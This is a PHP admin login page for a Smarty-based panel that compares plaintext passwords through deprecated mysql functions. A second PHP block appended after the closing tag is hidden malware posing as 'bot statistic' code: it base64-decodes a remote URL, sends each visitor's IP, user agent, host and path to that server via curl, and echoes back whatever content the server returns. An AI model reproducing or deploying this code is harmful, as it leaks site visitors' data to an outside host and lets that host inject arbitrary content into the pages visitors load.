<?php
session_start();

if($_SESSION["admin"]){
	header('location: admin.php');	
}
ini_set('display_errors', 0);
	
// put full path to Smarty.class.php

define("GPANEL", "YES");
include "../config.php";
require('../includes/libs/Smarty.class.php');
$smarty = new Smarty();

$smarty->setTemplateDir('template');
$smarty->setCompileDir('../cache/template_c');
$smarty->setCacheDir('../cache/other_c');
$smarty->setConfigDir('../includes/configs');
$smarty->assign('config', $configs);

if($_POST["login"]){
  $username = $_POST["login"];
  $password = $_POST["pass"];
  $username = stripslashes($username);
  $password = stripslashes($password);
  $username = mysql_real_escape_string($username);
  $password = mysql_real_escape_string($password);
	
  $check_login = mysql_query('SELECT * FROM admin WHERE username="'.$username.'" AND password="'.$password.'"');
  if(mysql_num_rows($check_login)==1){
	  mysql_query('UPDATE admin SET `lastactivity` = "'.$_SERVER['REQUEST_TIME'].'" WHERE id="'.$userinfo["id"].'"');
  	  $userinfo = mysql_fetch_array($check_login);	
  	  $_SESSION["admin"] = $userinfo["status"];
  	  $_SESSION["admin_id"] = $userinfo["id"];
  	  header("Location: admin.php");
  } else {
     $smarty->assign('error', 'Podaci za prijavu su netacni.');	  
  }
	
}


$smarty->display('login.tpl');
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>